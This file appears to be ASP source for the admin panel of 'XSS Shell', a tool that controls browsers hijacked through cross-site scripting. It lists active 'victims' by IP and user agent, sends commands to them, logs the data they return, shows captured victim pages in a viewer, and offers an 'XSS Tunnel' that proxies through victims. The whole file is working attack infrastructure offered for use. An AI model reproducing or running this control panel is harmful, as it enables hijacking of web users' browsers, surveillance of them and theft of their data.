<%

'09/08/2006
'	- Started
'
' 15/08/2006
'	- Working alpha
'
'18/08/2006
' New UI
'
'31/10/2006
' Now supports activity and shows active zombies and drops non-active ones
' Multiple victim support with send and save
' Faster victim notification

'01.04.2007
'	- Logs replaced AttackID for XSS Tunnel compatibility


' TODO;
'	- Log commands locally for analyze later
'	+ Build up connection interface 
'	- Command Shell
'	/ Command Interface
'	+ Implement AJAX for interface (low pr)


%>
<!--#include file="db.asp" -->
<%
	protected()

	Dim CallType
	CallType = fm_Qnstr("c")
	
	'Call only logs
	Select Case CallType 	
		Case 1
			Call Logs()
		
		Case 2
			Call Victims(False)

		Case 3 ' XSS Tunnel
			Call Victims(True)

	End Select

	'// Poor man's AJAX Calls
	If CallType > 0 Then Response.End

	Title = "XSS Shell Admin"

%>
<!--#include file="header.asp" -->
	<%
		Call ShowCommands()
	%>
	<div id="victims">
		<div id="victimsUpdater">
			<%Victims(False)%>
		</div>
	</div>
<div id="logHolder">
	<h2>Logs</h2>
	<div id="log"></div>
</div>	

<%
	Call Viewer()



'---------------------------------------------------------------------------
' Helpers
'---------------------------------------------------------------------------

Sub Victims(ByVal XSSTunnel)

	Dim RsVic
	getRs RsVic, "SELECT TOP " & MAX_VICTIM & " Victim.IP, Victim.ID, Victim.VictimID, RequestTime, RawUserAgent, Data FROM Victim, VictimDetail WHERE VictimDetail.VictimID = Victim.VictimID AND lastseen >  DATEADD(""s"",-" & Activity & ",Now) ORDER BY Victim.ID DESC"
		
		
	If XSSTunnel Then 
	
		If Not RsVic.EOF And Not RsVic.BOF Then
			Response.Write fm_Encode(RsVic("VictimId"))
			
		Else
			Response.Write NO_RECORD
		End IF
		
		Response.End

	End If
	

	Response.Write "<h2>Victims</h2>" 
	Dim viclist, Starter

	While Not RsVic.EOF 
		
		PrintVictim(RsVic)
		If Starter Then viclist = viclist & ","
		viclist = viclist & fm_Encode(RsVic("VictimID"))
		
		Starter	= True
		RsVic.MoveNext
	Wend

	Response.Write "[" & viclist

	fmKill RsVic

End Sub

Sub PrintVictim(ByVal Rs)

	Dim Data, ProxyData

	ProxyData = Rs("Data")
	If ProxyData <> "" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, "<br />")

	Data = Data & "<strong>Victim ID : </strong>" & fm_Encode(Rs("VictimID")) & "<br>"
	Data = Data & "<div class=code>" & fm_Encode(Rs("RawUserAgent")) & "</div>"
	If ProxyData <> "" Then Data = Data & "<div class=code>" & ProxyData & "</div>"

	Dim Checked 
	Checked = false

	With Response
		.Write "<div class=""commandl"" onmouseover=""hi(this)"" onmouseout=""lo(this)"" help=""" & Data & """ >"
		.Write "<img src=""mg/flags/" & GetCountry(Rs("IP")) & ".png"" alt=""" & GetCountry(Rs("IP")) & """ width=""20"" height=""13"" \> "
		.Write Rs("IP") & " / " & fm_Encode(Rs("VictimID")) & "</div>"
	End With

	'Response.Write "<ul><a href=""showdata.asp?i=" & Rs("ID") & "&m=1"">" & Rs("IP") & "</a> - <em>" & Rs("RequestTime") & "</em></ul>"
End Sub


' COMMANDS BOX
'---------------------------------------------------------------------------
' Show Available Commands

Sub ShowCommands()

%>
	<div id="commands">
		<h2>Commands</h2>
			<%
				Dim i
				For i = 0 To UBound(Commands) Step 3
					
					Response.Write "<div id=""cmd" & i & """ class=""commandl"" onmouseover=""hi(this)"" onmouseout=""lo(this)""><a href=""javascript:;"" onclick=""sendCommand('" & Commands(i+1) & "');new Effect.Highlight(document.getElementById('cmd" & i & "'), '#ff0000')"">" & fm_Encode(Commands(i)) & "</a><br>" & Commands(i+2) & "</div>"

				Next 
			%>
		<hr /><strong>Parameters :</strong> <br />
		<textarea name="params" id="params" style="width:98%;height:80px"></textarea>
		
		<input type="hidden" id="victims" value="" />
		<hr />
	</div>
<%

End Sub



' VIEWER BOX
'---------------------------------------------------------------------------
' Offline Content Viewer iframe 

Sub Viewer()

%>
	<div id="offlinebrowser">
		<h2>Viewer</h2>
		<iframe name="offlinebrw" id="offlinebrw" src="javascript:document.write('.');document.close()"></iframe>
	</div>
<%

End Sub


' LOGS BOX
'---------------------------------------------------------------------------
' Show recent logs from victims

Sub Logs()

	Dim RsLog
	getRs RsLog, "SELECT TOP " & DEFAULT_REC & " ID, Data, Type, AttackID, Shown FROM Log ORDER BY ID DESC"


'	Response.Write "<h2>Logs : " & Minute(Now) & ":" & Second(Now) & "</h2>"
	Response.Write "<ol>"

	While Not RsLog.EOF 
	
		PrintLog(RsLog)
		
		RsLog.MoveNext
	Wend

	Response.Write "</ol>"

	fmKill RsLog

End Sub

' Print and Format Logs
Function PrintLog(ByVal Rs)
	
	Dim Value 
	If Rs("Data") <> "" Then
		Value = fm_Encode(Rs("Data"))
		Value = Replace(Value, "%7Bn%7D", "<br />")
		Value = Replace(Value, "%3Atrue", "%3A<strong>true</strong>")
	
	Else
		Value = Rs("AttackID") & "..."

	End If

	Dim CSSname

	'// Pushed
	If Rs("Shown") = 1 Then
		CSSname = "pushed"
	End If

	If Rs("Data") <> "" Then
		CSSname = "done"
	End If



	Value = "<span class=""" & CSSName & """>" & Value & "</span>"

	If Rs("Type") = HTMLPAGE Then
			Value = "<a href=""showdata.asp?i=" & Rs("AttackID") & """ target=""offlinebrw"">HTML</a> - " & Rs("AttackID")
	End If

	Response.Write "<li>" & Value & "</li>"

End Function

%>

<!--#include file="footer.asp" -->
